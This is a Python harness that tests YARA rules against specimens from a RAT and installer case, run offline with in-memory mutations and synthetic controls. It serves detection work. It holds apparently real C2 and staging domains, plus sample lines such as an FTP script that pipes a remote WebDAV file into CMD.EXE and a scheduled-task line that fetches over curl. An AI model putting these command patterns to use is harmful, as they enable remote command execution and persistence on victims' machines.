"""Static YARA validation inside an offline Linux analysis VM.

Reads specimens only inside the guest. Changed specimens exist in memory only.
Exports hashes, counts and match results; never executes a specimen.
"""
from pathlib import Path
from hashlib import sha256
import argparse
import datetime
import io
import json
import platform
import re
import subprocess
import sys
import time
import pefile
import pylnk3
import yara

parser = argparse.ArgumentParser()
parser.add_argument('--case-root', type=Path, default=Path('/home/kali/majlis-analysis'))
parser.add_argument('--rules-dir', type=Path, default=Path(__file__).resolve().parent)
parser.add_argument('--output', type=Path)
args = parser.parse_args()
ROOT = args.case_root.resolve()
RULES = args.rules_dir.resolve()
OUTPUT = args.output or RULES / 'detection-validation-v2.json'
assert platform.system() == 'Linux', 'Use an isolated Linux guest; this harness is not a host scanner.'
links = json.loads(subprocess.check_output(['/usr/sbin/ip', '-j', 'link'], text=True))
assert all('UP' not in item['flags'] for item in links if item['ifname'] != 'lo'), 'Disconnect guest networking first.'
assert not subprocess.run(['/usr/bin/findmnt', '-rn', '-t', 'fuse.vmhgfs-fuse,vmhgfs'], capture_output=True, text=True).stdout.strip()
started = time.monotonic()
report = {
    'schema': 2, 'status': 'running', 'utc': datetime.datetime.now(datetime.timezone.utc).isoformat(),
    'network_offline': True, 'sample_execution': False, 'changed_specimens_saved': False,
    'yara_version': yara.__version__, 'rules': {}, 'specimens': [], 'clean_files': [],
    'clean_skipped': [], 'derived_controls': [], 'synthetic_controls': [], 'errors': [],
    'harness_sha256': sha256(Path(__file__).read_bytes()).hexdigest(),
}
EXACT = 'Majlis_2026_Exact_RAT_Or_Installer'
PE_CASE = 'Majlis_2026_RAT_Protocol_And_Capabilities'
MSI = 'Majlis_2026_Installer_Embedded_Protocol'
TASK = 'Majlis_2026_Task_And_Download_Script'
FTP_CASE = 'Majlis_2026_FTP_Script_WebDAV_Stage'
URL = 'Majlis_2026_WebDAV_Internet_Shortcut'
LNK = 'Majlis_2026_FTP_Launching_Shell_Link'
NATIVE = 'Majlis_Hunt_Native_Protocol_And_File_Errors'
FTP = 'Majlis_Hunt_FTP_WebDAV_Command_Pipe'
BATCH = 'Majlis_Hunt_Recurring_HTTP_Command_Script'
expected = {
    'Binary.exe': [EXACT, PE_CASE, NATIVE],
    'Imp_Details.msi.bin': [EXACT, MSI],
    'Scanned Document 2026.lnk.bin': [LNK],
    'Scanned Image.url': [URL],
    'icon.ico.bin': [FTP_CASE, FTP],
    'icon2.xz': [],
    'res.ico.bin': [TASK, BATCH],
}

def record(data, label, group, expected_matches=None, required=(), forbidden=(), **metadata):
    begin = time.monotonic()
    found = sorted(match.rule for match in rules.match(data=data, timeout=20))
    passed = (expected_matches is None or found == sorted(expected_matches)) and all(x in found for x in required) and all(x not in found for x in forbidden)
    row = {'name': label, 'bytes': len(data), 'sha256': sha256(data).hexdigest(), 'matches': found,
           'expected_matches': sorted(expected_matches) if expected_matches is not None else None,
           'required': list(required), 'forbidden': list(forbidden), 'passed': passed,
           'milliseconds': round((time.monotonic() - begin) * 1000, 3), **metadata}
    report[group].append(row)
    return row

def replace_required(data, old, new):
    count = data.count(old)
    assert count >= 1, 'Required mutation target absent'
    assert len(old) == len(new), 'Use length-preserving specimen changes'
    return data.replace(old, new), count

try:
    paths = {'case': RULES / 'majlis-case.yar', 'hunt': RULES / 'majlis-hunt.yar'}
    rules = yara.compile(filepaths={k: str(v) for k, v in paths.items()}, error_on_warning=True)
    report['compile_success'] = True
    report['compiler_warnings'] = []
    report['rules'] = {p.name: sha256(p.read_bytes()).hexdigest() for p in paths.values()}
    report['rule_names'] = sorted(rule.identifier for rule in rules)
    assert len(report['rule_names']) == 10
    specimen_dir = ROOT / 'extracted/Official Invitation Majilis 2026 Gala Dinner'
    identities = json.loads((RULES / 'iocs.json').read_text())
    file_ids = {row['name']: row for row in identities['files']}
    assert set(expected) == set(file_ids)
    samples = {}
    for name, want in expected.items():
        data = (specimen_dir / name).read_bytes()
        assert len(data) == file_ids[name]['size'] and sha256(data).hexdigest() == file_ids[name]['sha256']
        samples[name] = data
        record(data, name, 'specimens', want)
    archive = (ROOT / 'incoming/sample.7z').read_bytes()
    assert sha256(archive).hexdigest() == identities['archive']['sha256']
    record(archive, 'sample.7z (compressed, not unpacked by YARA)', 'specimens', [])

    # Files from specified installed software, not arbitrary security-tool/sample directories.
    clean_paths = []
    for path in sorted(Path('/usr/lib/python3/dist-packages/distlib').glob('*.exe')):
        clean_paths.append((path, 'installed_distlib_launcher'))
    for path in sorted(Path('/usr/share/dotnet/shared/Microsoft.NETCore.App').glob('*/*.dll')):
        clean_paths.append((path, 'installed_dotnet_assembly'))
    for name in ['/bin/ls', '/usr/bin/python3', '/etc/os-release', '/usr/share/common-licenses/GPL-3']:
        clean_paths.append((Path(name), 'installed_system_file'))
    for name in ['guest_readiness.py', 'guest_isolate.py', 'windows_set_lab_time.ps1']:
        path = RULES / name if (RULES / name).is_file() else ROOT / name
        if path.is_file():
            clean_paths.append((path, 'analyst_helper_source'))
    seen = set()
    for path, kind in clean_paths:
        data = path.read_bytes()
        digest = sha256(data).hexdigest()
        if digest in seen:
            report['clean_skipped'].append({'path': str(path), 'reason': 'duplicate_sha256'})
            continue
        seen.add(digest)
        if len(data) > 32 * 1024 * 1024:
            report['clean_skipped'].append({'path': str(path), 'reason': 'larger_than_32_MiB', 'bytes': len(data)})
            continue
        owner = subprocess.run(['/usr/bin/dpkg-query', '-S', str(path)], capture_output=True, text=True)
        details = {'guest_path': str(path), 'kind': kind, 'package_owner': owner.stdout.strip()[:350] if owner.returncode == 0 else None,
                   'within_native_rule_size_limit': len(data) < 10 * 1024 * 1024}
        if path.suffix.lower() in {'.exe', '.dll'}:
            parsed = pefile.PE(data=data, fast_load=True)
            details['has_clr_directory'] = bool(parsed.OPTIONAL_HEADER.DATA_DIRECTORY[14].VirtualAddress)
            parsed.close()
        record(data, path.name, 'clean_files', [], **details)
    assert any(r['kind'] == 'installed_distlib_launcher' for r in report['clean_files'])
    assert any(r['kind'] == 'installed_dotnet_assembly' for r in report['clean_files'])

    # Controlled changes to the existing specimen, in guest memory only.
    native = samples['Binary.exe']
    boundary = b'----Boundary43985743985798fjkfscxWW'
    changed, count = replace_required(native, boundary, b'-' * len(boundary))
    record(changed, 'native_changed_multipart_boundary', 'derived_controls', [NATIVE], modified_occurrences=count)
    domain = b'www.chestergreenfarming.com'
    encoded = bytes(c if c in {0, 10, 0x50, 0x5a} else c ^ 0x50 for c in domain)
    replacement = ('lab-' + 'x' * (len(domain) - len('lab-.invalid')) + '.invalid').encode()
    replacement = bytes(c if c in {0, 10, 0x50, 0x5a} else c ^ 0x50 for c in replacement)
    changed, count = replace_required(native, encoded, replacement)
    record(changed, 'native_changed_encoded_c2', 'derived_controls', [PE_CASE, NATIVE], modified_occurrences=count)
    changed, count = replace_required(native, b'OTP: ', b'XYZ: ')
    record(changed, 'native_changed_otp_header', 'derived_controls', [NATIVE], modified_occurrences=count)
    for marker, label in [(b'next_data', 'schema'), (b'ClientID: ', 'client_header'), (b'CreateProcessW', 'process_import')]:
        changed, count = replace_required(native, marker, b'X' * len(marker))
        record(changed, 'native_missing_' + label, 'derived_controls', required=(), forbidden=[NATIVE], modified_occurrences=count)
    errors = [b'Cannot open file (UTF-16 path unsupported by locale)', b'Cannot write to file (UTF-16 path unsupported by locale)', b'Invalid HTTP response']
    changed, count = replace_required(native, errors[0], b'X' * len(errors[0]))
    record(changed, 'native_two_error_markers_remaining', 'derived_controls', required=[NATIVE], modified_occurrences=count)
    changed, count2 = replace_required(changed, errors[1], b'X' * len(errors[1]))
    record(changed, 'native_one_error_marker_remaining', 'derived_controls', forbidden=[NATIVE], modified_occurrences=count + count2)
    changed, count = replace_required(native, b'BitBlt', b'XXXXXX')
    record(changed, 'native_drive_import_alternative', 'derived_controls', [NATIVE], modified_occurrences=count)
    changed, count2 = replace_required(changed, b'GetLogicalDrives', b'X' * len(b'GetLogicalDrives'))
    record(changed, 'native_no_screen_or_drive_import', 'derived_controls', [], modified_occurrences=count + count2)
    marker_blob = b'\0'.join([b'next_data', b'client_id', b'ClientID: ', *errors])
    record(b'MZ' + b'\0' * 80 + marker_blob, 'invalid_pe_with_all_native_markers', 'synthetic_controls', [])
    clean_pe = next(path for path, kind in clean_paths if kind == 'installed_dotnet_assembly' and path.name == 'System.Console.dll').read_bytes()
    record(clean_pe + marker_blob, 'clean_pe_markers_but_no_required_imports', 'synthetic_controls', [])

    link = samples['Scanned Document 2026.lnk.bin']
    changed = bytearray(link)
    changed[4] ^= 1
    record(bytes(changed), 'lnk_wrong_clsid_valid_header_size', 'derived_controls', [])
    changed = bytearray(link)
    changed[0] ^= 1
    record(bytes(changed), 'lnk_wrong_header_size', 'derived_controls', [])
    record(link[:20], 'lnk_truncated_header', 'derived_controls', [])
    generated = RULES / 'generated-benign'
    generated.mkdir(exist_ok=True)
    benign_links = [
        ('ftp_transfer', r'C:\Windows\System32\ftp.exe', '-s:transfer.txt', r'C:\Windows\System32\shell32.dll'),
        ('browser', r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe', 'https://example.invalid/', None),
        ('notepad', r'C:\Windows\System32\notepad.exe', '', None),
    ]
    for name, target, arguments, icon in benign_links:
        path = generated / (name + '.lnk')
        lnk = pylnk3.for_file(target, arguments=arguments, icon_file=icon)
        lnk.save(str(path))
        data = path.read_bytes()
        pylnk3.parse(io.BytesIO(data))
        record(data, 'generated_valid_lnk_' + name, 'synthetic_controls', [])

    ftp = samples['icon.ico.bin']
    changed = ftp.replace(b'rappellingaart.com', b'files.example.invalid')
    assert changed != ftp
    record(changed, 'ftp_changed_host', 'derived_controls', [FTP])
    for suffix, data in [('uppercase', changed.upper()), ('utf16le', changed.decode().encode('utf-16le'))]:
        record(data, 'ftp_changed_host_' + suffix, 'derived_controls', [FTP])
    record(b'\xff\xfe' + changed.decode().encode('utf-16le'), 'ftp_changed_host_utf16le_bom', 'derived_controls', [FTP])
    record(b'\xef\xbb\xbf' + changed, 'ftp_changed_host_utf8_bom', 'derived_controls', [FTP])
    ftp_positive = '!  MORE "\\\\files.example.invalid@SSL\\documents\\queue.txt" | CMD.EXE\r\nbye\r\n'
    record(ftp_positive.encode(), 'ftp_changed_host_path_spacing', 'synthetic_controls', [FTP])
    for name, text in {
        'ordinary_ftp': 'open ftp.example.invalid\nuser anonymous reader@example.invalid\nget release.txt\nbye\n',
        'local_more_to_cmd': '!more C:\\local\\commands.txt | cmd\nbye\n',
        'webdav_without_pipe': '!more \\\\files.example.invalid@SSL\\documents\\queue.txt\nbye\n',
        'webdav_to_findstr': '!more \\\\files.example.invalid@SSL\\documents\\queue.txt | findstr "ok"\nbye\n',
        'webdav_pipe_split_lines': '!more \\\\files.example.invalid@SSL\\documents\\queue.txt\n|cmd\nbye\n',
        'commented_example': 'REM ' + ftp_positive,
        'quoted_example': 'Documentation: ' + ftp_positive,
    }.items():
        record(text.encode(), name, 'synthetic_controls', [])
    batch = samples['res.ico.bin']
    changed = batch
    mutation_counts = {}
    for label, original, replacement in [('host', b'gomescareerplans.com', b'updates.example.invalid'), ('task', b'updates88679', b'lab-job'), ('interval', b'/mo 39', b'/mo 51'), ('path', b'err.log', b'queue.txt')]:
        count = changed.count(original)
        assert count > 0, 'Batch mutation target absent: ' + label
        mutation_counts[label] = count
        changed = changed.replace(original, replacement)
    record(changed, 'batch_changed_host_task_interval_path', 'derived_controls', [BATCH], modified_occurrences=mutation_counts)
    record(changed.decode().encode('utf-16le'), 'batch_changed_identifiers_utf16le', 'derived_controls', [BATCH])
    lines = changed.splitlines(keepends=True)
    echo_line = next(line for line in lines if line.lower().startswith(b'echo'))
    task_line = next(line for line in lines if line.lower().startswith(b'schtasks'))
    record(echo_line, 'batch_fetcher_without_scheduler', 'derived_controls', [])
    record(task_line, 'batch_scheduler_without_written_fetcher', 'derived_controls', [])
    record(changed.replace(b'/sc minute', b'/sc daily'), 'batch_different_schedule_class', 'derived_controls', [])
    record(b'schtasks /create /sc minute /mo 30 /tn HealthCheck /tr "cmd /c echo healthy"\r\ncurl https://updates.example.invalid/version.txt > version.txt\r\n', 'ordinary_scheduled_healthcheck_and_download', 'synthetic_controls', [])

    report['counts'] = {key: len(report[key]) for key in ['specimens', 'clean_files', 'derived_controls', 'synthetic_controls']}
    report['clean_by_kind'] = {kind: sum(row['kind'] == kind for row in report['clean_files']) for kind in sorted({row['kind'] for row in report['clean_files']})}
    report['all_expectations_met'] = all(row['passed'] for key in ['specimens', 'clean_files', 'derived_controls', 'synthetic_controls'] for row in report[key])
    report['failed_cases'] = [row['name'] for key in ['specimens', 'clean_files', 'derived_controls', 'synthetic_controls'] for row in report[key] if not row['passed']]
    report['status'] = 'passed' if report['all_expectations_met'] else 'failed'
except Exception as exc:
    report['status'] = 'failed'
    report['all_expectations_met'] = False
    report['errors'].append({'type': type(exc).__name__, 'message': str(exc)[:1000]})
report['elapsed_seconds'] = round(time.monotonic() - started, 3)
report['coverage'] = {'independently_collected_cases': 1, 'changed_specimens_are_synthetic_controls': True, 'generated_links_are_synthetic_controls': True, 'real_clean_msi_corpus': False, 'real_clean_lnk_corpus': False}
OUTPUT.write_text(json.dumps(report, indent=2), encoding='utf-8')
raise SystemExit(0 if report['all_expectations_met'] else 1)
